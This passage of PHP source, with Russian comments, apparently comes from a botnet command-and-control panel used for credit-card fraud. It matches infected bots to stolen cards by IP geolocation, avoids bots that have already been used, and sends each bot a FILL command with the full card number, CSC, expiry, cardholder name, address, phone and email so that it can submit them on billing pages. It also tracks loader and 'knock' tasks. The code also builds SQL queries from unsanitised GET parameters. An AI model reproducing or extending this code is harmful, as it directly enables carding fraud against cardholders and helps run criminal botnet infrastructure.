			
			// Участвовал ли бот в этом задании ранее?
			$sql = "SELECT bots_t.id_bot"
				 . " FROM bots_t, global_tasks_t, dtimes_run_t, tasks_t, city_t, country_t"
				 . " WHERE fk_global_task_dtimes_run = id_global_task"
				 . " AND dtimes_run_t.fk_task_dtimes_run = tasks_t.id_task"
				 . " AND tasks_t.fk_bot_task = bots_t.id_bot"
				 . " AND fk_city_bot = id_city"
				 . " AND fk_country_city = id_country"
				 . " AND id_global_task = " . $id_gt . ""
				 . " AND id_bot = " . $id_bot . ""
				 . " LIMIT 1";
			$res = mysqli_query($dbase, $sql);
			if ((!(@($res))) || mysqli_num_rows($res) != 0) {
				writelog("debug.log", "Bot already process this task ( \" $sql \" )");
				CheckForRep($dbase, $id_bot, $GlobalTaskForRep);
				free_sem($sem_id);
				db_close($dbase);
				return 0;
			}
			
			// Прошло ли достаточное количество времени, чтобы снова послать бота на задание? (теперь смотрим не по ID бота, а по его IP-адресам)
			$CHECK_IDENTICAL_BOT_IP = $icfg['CHECK_IDENTICAL_BOT_IP'];
			if (strlen($CHECK_IDENTICAL_BOT_IP) != 1) {
				$CHECK_IDENTICAL_BOT_IP = TRUE;
				writelog('error.log', 'Cannot read CHECK_IDENTICAL_BOT_IP from config');
			}
			else {
				($CHECK_IDENTICAL_BOT_IP == '0') ? $CHECK_IDENTICAL_BOT_IP = FALSE : $CHECK_IDENTICAL_BOT_IP = TRUE;
			}
			if ($CHECK_IDENTICAL_BOT_IP) {
				$sql = "SELECT ip FROM ip_t WHERE fk_bot = $id_bot";
				$res = mysqli_query($dbase, $sql);
				if ((@($res)) && mysqli_num_rows($res) > 0) {
					while ($mres = mysqli_fetch_array($res)) {
						$ip = $mres['ip'];
						
						$sql = "SELECT COUNT(*) FROM bots_t, ip_t"
							 . " WHERE bots_t.id_bot <> $id_bot"
							 . "   AND bots_t.id_bot = ip_t.fk_bot"
							 . "   AND ip_t.ip = '$ip'"
							 . "   AND ("
							 . "       UNIX_TIMESTAMP( date_last_run_bot ) >= ( UNIX_TIMESTAMP( now( ) ) - UNIX_TIMESTAMP('" . $wait_before_start . "') )"
							 . "       )";
						$sres = mysqli_query($dbase, $sql);
						if ((@($sres)) && mysqli_num_rows($sres) != 0) {
							list($cnt) = mysqli_fetch_row($sres);
						}
						else {
							writelog("error.log", "Wrong query : \" $sql \"");
							db_close($dbase);
							return 0;
						}
						// Есть ли хоть 1 бот с таким же IP как и текущий, который выполнял какие-либо задания в течении WAIT_BEFORE_START?
						if ($cnt) {
							writelog("debug.log", "Bot ($id_bot). Blocked by CHECK_IDENTICAL_BOT_IP ( \" $sql \" )");
							CheckForRep($dbase, $id_bot, $GlobalTaskForRep);
							free_sem($sem_id);
							db_close($dbase);
							return 0;
						}
					}
				}
				else {
					writelog("error.log", "Wrong query : \" $sql \"");
					db_close($dbase);
					return 0;
				}
			}			
		
			// Не допускаем до задания ботов, у которых возникают проблемы с использованием IE
						$disable_sloppy_bots = $icfg['DISABLE_SLOPPY_BOTS'];
			if (strlen($disable_sloppy_bots) != 1) {
				$disable_sloppy_bots = TRUE;
				writelog('error.log', 'Cannot read DISABLE_SLOPPY_BOTS from config');
			}
			else {
				($disable_sloppy_bots == '0') ? $disable_sloppy_bots = FALSE : $disable_sloppy_bots = TRUE;
			}
			if ($disable_sloppy_bots) {
				$sql = "SELECT *"
					 . " FROM bots_rep_t"
					 . " WHERE fk_bot_rep = $id_bot"
					 . "	 AND data_rep like '%sloppy%'"
					 . " LIMIT 1";
				$res = mysqli_query($dbase, $sql);
				if ((!(@($res))) || mysqli_num_rows($res) != 0) {
					writelog("debug.log", "Bot ($id_bot). Blocked by DISABLE_SLOPPY_BOTS ( \" $sql \" )"); 
					CheckForRep($dbase, $id_bot, $GlobalTaskForRep);
					free_sem($sem_id);
					db_close($dbase);
					return 0;
				}
			}
		
			// 
			// Проверка на geo-ip совместимость
			// 
			
			// 
			//	Бот, подходящий по городу и стране:
				
			//	... выбираем страну, штат и город бота
			$sql = ' SELECT id_country, state, name_city, name_country'
				 . '   FROM bots_t, city_t, country_t'
				 . '  WHERE bots_t.fk_city_bot = city_t.id_city'
				 . '    AND city_t.fk_country_city = country_t.id_country'
				 . '    AND bots_t.id_bot = ' . $id_bot
				 . ' LIMIT 1'; 
			$res = mysqli_query ($dbase, $sql);
			if ((!(@($res))) || !mysqli_num_rows($res)) {
				writelog("error.log", "Wrong query : \" $sql \"");
				free_sem($sem_id);
				db_close($dbase);
				return 0;
			}
			list($id_country, $state, $city, $country) = mysqli_fetch_row($res);
					
			// Мда... морфологические проблемы...
			$id_country_alt = '0';
			if ( !strcasecmp($country, "United States") ) {
				$sql = ' SELECT id_country'
					 . '   FROM country_t'
					 . "  WHERE name_country LIKE 'US'"
					 . ' LIMIT 1';
				$res = mysqli_query ($dbase, $sql);
				if ((!(@($res)))/* || !mysqli_num_rows($res)*/)	{
					writelog("error.log", "Wrong query : \" $sql \"");
					free_sem($sem_id);
					db_close($dbase);
					return 0;
				}
				else if (mysqli_num_rows($res) != 0)
					list($id_country_alt) = mysqli_fetch_row($res);
			}
			if ( !strcasecmp($country, "Canada") ) {
				$sql = ' SELECT id_country'
					 . '	 FROM country_t'
					 . "	WHERE name_country LIKE 'CA'"
					 . '	LIMIT 1';
				$res = mysqli_query ($dbase, $sql);
				if ((!(@($res)))/* || !mysqli_num_rows($res)*/)	{
					writelog("error.log", "Wrong query : \" $sql \"");
					free_sem($sem_id);
					db_close($dbase);
					return 0;
				}
				else if (mysqli_num_rows($res) != 0)
					list($id_country_alt) = mysqli_fetch_row($res);
			}
			if ( !strcasecmp($country, "Australia") ) {
				$sql = ' SELECT id_country'
					 . '	 FROM country_t'
					 . "	WHERE name_country LIKE 'AU'"
					 . '	LIMIT 1';
				$res = mysqli_query ($dbase, $sql);
				if ((!(@($res)))/* || !mysqli_num_rows($res)*/)	{
					writelog("error.log", "Wrong query : \" $sql \"");
					free_sem($sem_id);
					db_close($dbase);
					return 0;
				}
				else if (mysqli_num_rows($res) != 0)
					list($id_country_alt) = mysqli_fetch_row($res);
			}
				
			if ( !($ChkSt) )
				$state = "%";
			// ... ищем неиспользованные номера карт, подходящих по вытащенным выше данным
			$sql = 'SELECT cards.id_card, cards.num, cards.fk_email'
				 . ' FROM cards, country_t'
				 . " WHERE cards.city like '$city'"
				 . " AND cards.state like '$state'"
				 . ' AND cards.fk_country = country_t.id_country'
				 . " AND ( (country_t.id_country = $id_country) OR (country_t.id_country = $id_country_alt) )"
				 . ' AND cards.used <> 1'
				 . ' AND cards.id_card NOT IN (SELECT tasks_t.fk_card_task FROM tasks_t)'
				 . ' AND cards.fk_gtask = ' . $id_gt
				 . ' LIMIT 1'; 
			$res = mysqli_query ($dbase, $sql);
			if ((!(@($res))) || !mysqli_num_rows($res)) {
				$id_card = NULL;
			}
			else {
				list($id_card, $card_num, $email) = mysqli_fetch_row($res);
			}
				
			//... если таких карт нет ( и нам нужно не 100% совпадение IP), то ... ищем карту, котороя подходит хотя бы по стране и по региону
			if (!($ChkCt) && !($id_card)) {
				$sql = 'SELECT cards.id_card, cards.num, cards.fk_country, cards.state, cards.city, cards.fk_email, country_t.name_country'
					. ' FROM cards, country_t'
					. " WHERE cards.state like '" . $state . "'"
					. ' AND cards.fk_country = country_t.id_country'
					. " AND ( (country_t.id_country = $id_country) OR (country_t.id_country = $id_country_alt) )"
					. ' AND cards.id_card NOT IN (SELECT tasks_t.fk_card_task FROM tasks_t)'
					. ' AND cards.fk_gtask = ' . $id_gt
					. ' LIMIT 1'; 
				$res = mysqli_query ($dbase, $sql);
				if ((!(@($res))) || !mysqli_num_rows($res)) {
					$id_card = NULL;
					writelog("debug.log", "Cannot find card for bot (#$id_bot) : \" $sql \"");
					CheckForRep($dbase, $id_bot, $GlobalTaskForRep);
					free_sem($sem_id);
					db_close($dbase);
					return 0;
				}
				else {
					list($id_card, $card_num, $id_country, $state, $city, $email, $country) = mysqli_fetch_row($res);
				}

				if ( !($ChkSt) )
					$state = "%";
					
				refresh_bot_info($dbase);
				// если такая карта нашлась, смотрим наиболее подходящих для вбива этой карты ботов (при этом наиболее подходящий по GEO-IP бот должен подходить по других параметрам типа, быть не sloppy и быть свободным для этого биллинга) - и, если не находим, то карту вбивает текущий бот
				$sql = ' SELECT count(*)'
					 . ' FROM bots_t, city_t, country_t'
					 . ' WHERE bots_t.fk_city_bot = city_t.id_city'
					 . ' AND city_t.fk_country_city = country_t.id_country'
					 . " AND country_t.id_country = '$id_country'"
					 . " AND city_t.state like '$state'"
					 . " AND city_t.name_city like '$city'"
					 . " AND bots_t.status_bot = 'online'"
					 . " AND ( bots_rep_t.data_rep like '%sloppy%'"
					 . "	 OR UNIX_TIMESTAMP( date_last_run_bot ) >= ( UNIX_TIMESTAMP( now( ) ) - UNIX_TIMESTAMP('" . $wait_before_start . "') )"
					 . " AND bots_t.id_bot <> $id_bot"
					 . ' LIMIT 1'; 
				$res = mysqli_query ($dbase, $sql);
				if ((@($res)) && mysqli_num_rows($res) != 0) {
					list($bcnt) = mysqli_fetch_row($res);
					if ($bcnt) {
						writelog("error.log", "There exist more coolest bot -> \"" . $sql . "\"");
						CheckForRep($dbase, $id_bot, $GlobalTaskForRep);
						free_sem($sem_id);
						db_close($dbase);
						return 0;
					}
				}				
			}
				
			if (!($id_card)) {
				writelog("error.log", "Cards not found! -> \" $sql \"");
				free_sem($sem_id);
				db_close($dbase);
				return 0;
			}	

			$sql = " INSERT INTO tasks_t "
	 			 . " VALUES (NULL, $id_bot, '" . gmdate('Y.m.d H:i:s') . "', 0, NULL, $id_card, $email)";
			$res = mysqli_query ($dbase, $sql);

			if (mysqli_affected_rows($dbase) != 1) {
				writelog("error.log", "Wrong query : \" $sql \"");
				free_sem($sem_id);
				db_close($dbase);
				return 0;
			}
			
			// Установка задания на опред. время
			$id_t = mysqli_insert_id($dbase);
			$sql = "UPDATE dtimes_run_t"
				 . " SET fk_task_dtimes_run = " . $id_t . ""
				 . " WHERE id_dtime_run = " . $id_dtr
				 . " LIMIT 1";
			$res = mysqli_query($dbase, $sql);
			if (mysqli_affected_rows($dbase) != 1) {
				writelog("error.log", "Wrong query : \" $sql \"");
				free_sem($sem_id);
				mysqli_rollback($dbase);
				db_close($dbase);
				return 0;
			}

			// Делаем бота активным
			bot_setonline($dbase, $bot_ver, $os_bot, $ie_bot, $usertp_bot, $id_bot);
			
			// Получаем текст ссылки на биллинг
			$sql = 'SELECT text_url_urls'
				 . ' FROM urls_t '
				 . " WHERE urls_t.id_url = $fk_url"
				 . ' LIMIT 1';
			$res = mysqli_query ($dbase, $sql);
			if ((!(@($res))) || !mysqli_num_rows($res)) {
				writelog("error.log", "Wrong query : \" $sql \"");
				free_sem($sem_id);
				db_close($dbase);
				return 0;
			}
			list($text_url) = mysqli_fetch_row($res);

	 
			// Получаем текст ссылки на RefPage
			$sql = 'SELECT text_url_urls'
				 . ' FROM urls_t '
				 . " WHERE urls_t.id_url = " . $fk_ref_url
				 . ' LIMIT 1';
			$res = mysqli_query ($dbase, $sql);
			if ((!(@($res))) || !mysqli_num_rows($res)) {
				writelog("error.log", "Wrong query : \" $sql \"");
				free_sem($sem_id);
				db_close($dbase);
				return 0;
			}
			list($text_ref_url) = mysqli_fetch_row($res);
			// Очищаем строку от нежелательных символов
			$text_ref_url = str_replace("\r", '', $text_ref_url);
			$text_ref_url = str_replace("\n", '', $text_ref_url);			

			// Получаем данные по карте
			$sql = ' SELECT cards.num, cards.csc, cards.exp_date, cards.name, cards.surname, cards.address, cards.city, cards.state, cards.post_code, country_t.name_country, cards.phone_num, email_t.value_email '
				 . ' FROM cards, country_t, email_t'
				 . ' WHERE cards.fk_email = email_t.id_email'
				 . '   AND cards.fk_country = country_t.id_country'
				 . "   AND cards.id_card = $id_card"
				 . ' LIMIT 1';
			$res = mysqli_query ($dbase, $sql);
			if ((!(@($res))) || !mysqli_num_rows($res)) {
				writelog("error.log", "Wrong query : \" $sql \"");
				free_sem($sem_id);
				db_close($dbase);
				return 0;
			}				
			list($num_card, $csc, $exp_date, $name, $surname, $address, $city, $state, $post_code, $country, $phone_num, $email) = mysqli_fetch_row($res);
			
			// fix for kvip
			$email = trim(strtolower($email));
				
			// Конверт времени в формат типа "01/13"
			list($year, $month) = split('[\/.-]', $exp_date);
			$exp_date = gmdate("m/y", mktime(0, 0, 0, $month, 1, $year));
				
			$go = "FILL<br>"
				. "$text_url<br>"
				. encode(base64_decode($num_card), $csc) . ";$csc;$exp_date;$name;$surname;$address;$city;$state;$post_code;$country;$phone_num;$email<br>"
				."$text_ref_url<br>"
				."$id_t";	
			echo $go;
			
			global $isActive; $isActive = true;
				
			// Шифруем номер карты, перед записью в лог
			$num = encode(base64_decode($num_card), $csc);
			
			$go = "FILL<br>"
				. "$text_url<br>"
				. substr($num, 0, strlen($num) - 4) . 'XXXX' . ";$csc;$exp_date;$name;$surname;$address;$city;$state;$post_code;$country;$phone_num;$email<br>"
				."$text_ref_url<br>"
				."$id_t";	
			$finish_time = microtime(1);
			writelog("tasks.log", "FILL (" . ($finish_time - $start_time) . " sec.): \"" . $go . "\"");
				
			free_sem($sem_id);
				
			break;

		// Когда бот успешно завершил задание
		
		case 'complete':
			$cur_date = gmdate('Y.m.d H:i:s');

			(@$_GET['tid']) ? $tid = $_GET['tid'] : $tid = 0;
				
			$sql =	 "SELECT id_task, id_global_task"
				   . " FROM tasks_t, dtimes_run_t, global_tasks_t"
				   . " WHERE fk_bot_task = $id_bot"
				   . "	 AND id_task = $tid"
				   . "	 AND id_task = fk_task_dtimes_run"
				   . "	 AND id_global_task = fk_global_task_dtimes_run"
				   . " ORDER BY id_task DESC"
				   . " LIMIT 1";
			$sel = mysqli_query($dbase, $sql);
			// Найдено ли задание?
			if ((!@$sel) || !mysqli_num_rows($sel)) {
				writelog('error.log', "Cannot find task in COMPLETE-event ( \" $sql \" )");
				db_close($dbase);
				return 0;
			}
			list ($ID_TASK, $ID_GT) = mysqli_fetch_row($sel);
			
			$GlobalTaskForRep = $ID_GT;
				
			// Проставляем статус задания как выполненное
			$sql = "UPDATE tasks_t"
				 . "    SET status_task = 1, end_time_task = '" . $cur_date . "'"
				 . " WHERE fk_bot_task = " . $id_bot
				 . "	  AND id_task = " . $ID_TASK
				 . "	  AND status_task <> 1"
				 . " LIMIT 1";
			$res = mysqli_query($dbase, $sql);
			if (mysqli_affected_rows($dbase) != 1)  {
				writelog("error.log", "Wrong query : \" $sql \"");
				db_close($dbase);
				return 0;
			}

			// Меняем статус бота с "Active" на "Online"
			bot_setonline($dbase, $bot_ver, $os_bot, $ie_bot, $usertp_bot, $id_bot);
			
			bot_setlastrun($dbase, $id_bot);
				
			// Обновляем информацию о использованных картах
			$sql = 'UPDATE cards'
				 . ' SET cards.used = 1'
				 . ' WHERE cards.id_card IN (SELECT tasks_t.fk_card_task FROM tasks_t WHERE tasks_t.status_task = 1)'; 
			$res = mysqli_query($dbase, $sql);
			if (mysqli_affected_rows($dbase) == 0) {
				writelog("error.log", "Its very strange... no cards for update used-status ( \" $sql \" )");
			}

			if (mysqli_num_rows($sel) > 0) {
				// Вставляем в таблицу с логами заданий инфу о том, что задание успешно выполнено
				getip($ip, $inip);
				($ip == $inip) ? $sip = $ip : $sip = "$ip;$sip";
				$sql = " INSERT "
					 . "   INTO logs_t"
					 . " VALUES (NULL, $ID_TASK, 'TASK IS OK', '[$sip]')";
				$res = mysqli_query($dbase, $sql);
				if (mysqli_affected_rows($dbase) != 1) {
					writelog("error.log", "Wrong query : \" $sql \"");
					db_close($dbase);
					return 0;
				}
				
				// Удаляем дубликаты логов, оставляя самый последний
				$sql = "SELECT id_log"
					. "   FROM logs_t"
					. "  WHERE id_log NOT"
					. " IN ("
					. "   SELECT MAX( ID_LOG )"
					. "   FROM logs_t"
					. "   GROUP BY fk_task_log"
					. " )";
				$res = mysqli_query($dbase, $sql);
				if ((@($res)) && mysqli_num_rows($res) > 0) {
					while ($mres = mysqli_fetch_array($res)) {
						$sql = "DELETE"
							 . " FROM logs_t"
							 . " WHERE id_log = " . $mres['id_log'];
						mysqli_query($dbase, $sql);
					}
				}
			}
			break;

		// Когда бот сообщает об критической ошибке при выполнении задания
			
		case 'error':
			$cur_date = gmdate('Y.m.d H:i:s');

			writelog("debug.log", "Bot #$id_bot talk about error...");
						
			(@$_GET['tid']) ? $tid = $_GET['tid'] : $tid = 0;
		
			// Ставим статус "Error" для последнего задания, что выполнял бот
			$sql_ = "SELECT id_task, id_global_task"
				 . " FROM tasks_t, dtimes_run_t, global_tasks_t"
				 . " WHERE fk_bot_task = $id_bot"
				 . "   AND id_task = $tid"
				 . "   AND id_task = fk_task_dtimes_run"
				 . "   AND id_global_task = fk_global_task_dtimes_run"
				 . " ORDER BY id_task DESC"
				 . " LIMIT 1";
			$sel = mysqli_query($dbase, $sql_);
			if ((!@$sel) || !mysqli_num_rows($sel)) {
				writelog('error.log', "Cannot find task in ERROR-event ($sql_)");
				db_close($dbase);
				return 0;
			}
			list ($ID_TASK, $ID_GT) = mysqli_fetch_row($sel);
			// 
			$sql = "UPDATE tasks_t"
				 . "   SET status_task = -1 "
				 . " WHERE fk_bot_task = " . $id_bot
				 . "   AND id_task = " . $ID_TASK;
			$res = mysqli_query($dbase, $sql);
			// Меняем статус бота с "Active" на "Online"
			bot_setonline($dbase, $bot_ver, $os_bot, $ie_bot, $usertp_bot, $id_bot);
			
			bot_setlastrun($dbase, $id_bot);

			// Готовим задание на перенаправление новому боту ...
			$GlobalTaskForRep = $ID_GT;
					
			// Вставляем в таблицу с логами заданий инфу о том, что задание перенаправляется другому боту ...
			getip($ip, $inip);
			($ip == $inip) ? $sip = $ip : $sip = "$ip;$sip";
			$sql = " INSERT "
				 . "   INTO logs_t"
				 . " VALUES (NULL, $ID_TASK, 'ERROR', '[$sip]')";
			$res = mysqli_query($dbase, $sql);
			
			if (mysqli_affected_rows($dbase) != 1) {
				writelog("error.log", "Wrong query : \" $sql \"");
				db_close($dbase);
				return 0;
			}
			
			// Удаляем дубликаты логов, оставляя самый последний
			$sql = "SELECT id_log"
				 . " FROM logs_t"
				 . " WHERE id_log NOT"
				 . " IN ("
				 . " SELECT MAX( ID_LOG )"
				 . " FROM logs_t"
				 . " GROUP BY fk_task_log"
				 . " )";
			$res = mysqli_query($dbase, $sql);
			if ((@($res)) && mysqli_num_rows($res) > 0) {
				while ($mres = mysqli_fetch_array($res)) {
					$sql = "DELETE"
						 . " FROM logs_t"
						 . " WHERE id_log = " . $mres['id_log'];
					mysqli_query($dbase, $sql);
				}
			}
			break;

		// Когда бот выполняет задание
			
		case 'active':
			$rep = $_GET['rep'];
			if ($rep) {
				writelog("active.log", "[ID_BOT : $id_bot] $rep");
			}
			db_close($dbase);
			return 0;
			break;
			
		case 'load-complete':
			(@$_GET['tid']) ? $tid = $_GET['tid'] : $tid = 0;
			
			// Вставляем отчёт
			$bot_rep = $_GET['rep'];
			$sqlp = '';
			if (@($bot_rep))
				$sqlp = ", rep = '$bot_rep'";
				
			// Проставляем статус задания как выполненное
			$sql = "UPDATE tasks_loader_t"
				 . "   SET status = 2$sqlp"
				 . " WHERE id = $tid"
				 . " LIMIT 1";
			mysqli_query($dbase, $sql);
			if (mysqli_affected_rows($dbase) != 1)  {
				writelog("error.log", "Wrong query : \" $sql \"");
				db_close($dbase);
				return 0;
			}

			// Меняем статус бота с "Active" на "Online"
			bot_setonline($dbase, $bot_ver, $os_bot, $ie_bot, $usertp_bot, $id_bot);
			
			break;
			
		case 'load-error':
			(@$_GET['tid']) ? $tid = $_GET['tid'] : $tid = 0;
			
			// Вставляем отчёт
			$bot_rep = $_GET['rep'];
			$sqlp = '';
			if (@($bot_rep))
				$sqlp = ", rep = '$bot_rep'";
			
			// Ставим статус "Error" для последнего задания, что выполнял бот
			$sql = "UPDATE tasks_loader_t"
				 . "   SET status = 3$sqlp"
				 . " WHERE id = $tid"
				 . " LIMIT 1";
			mysqli_query($dbase, $sql);
			if (mysqli_affected_rows($dbase) != 1)  {
				writelog("error.log", "Wrong query : \" $sql \"");
				db_close($dbase);
				return 0;
			}

			// Меняем статус бота с "Active" на "Online"
			bot_setonline($dbase, $bot_ver, $os_bot, $ie_bot, $usertp_bot, $id_bot);
			
			break;
			
		case 'knock-complete':
			(@$_GET['tid']) ? $tid = $_GET['tid'] : $tid = 0;
			
			// Вставляем отчёт
			$bot_rep = $_GET['rep'];
			$sqlp = '';
			if (@($bot_rep))
				$sqlp = ", rep = '$bot_rep'";
				
			// Проставляем статус задания как выполненное
			$sql = "UPDATE tasks_knock_t"
				 . "   SET status = 2$sqlp"
				 . " WHERE id = $tid"
				 . " LIMIT 1";
			mysqli_query($dbase, $sql);
			if (mysqli_affected_rows($dbase) != 1)  {
				writelog("error.log", "Wrong query : \" $sql \"");
				db_close($dbase);
				return 0;
			}

			// Меняем статус бота с "Active" на "Online"
			bot_setonline($dbase, $bot_ver, $os_bot, $ie_bot, $usertp_bot, $id_bot);
			
			break;
			
		case 'knock-error':
			(@$_GET['tid']) ? $tid = $_GET['tid'] : $tid = 0;
			
			// Вставляем отчёт
			$bot_rep = $_GET['rep'];
			$sqlp = '';
			if (@($bot_rep))
				$sqlp = ", rep = '$bot_rep'";
			
			// Ставим статус "Error" для последнего задания, что выполнял бот
			$sql = "UPDATE tasks_knock_t"
				 . "   SET status = 3$sqlp"
				 . " WHERE id = $tid"
				 . " LIMIT 1";
			mysqli_query($dbase, $sql);
			if (mysqli_affected_rows($dbase) != 1)  {
				writelog("error.log", "Wrong query : \" $sql \"");
				db_close($dbase);
				return 0;
			}

			// Меняем статус бота с "Active" на "Online"
			bot_setonline($dbase, $bot_ver, $os_bot, $ie_bot, $usertp_bot, $id_bot);
			
			break;
	}
		
		CheckForRep($dbase, $id_bot, $GlobalTaskForRep);
		db_close($dbase);
}

}

process();

?>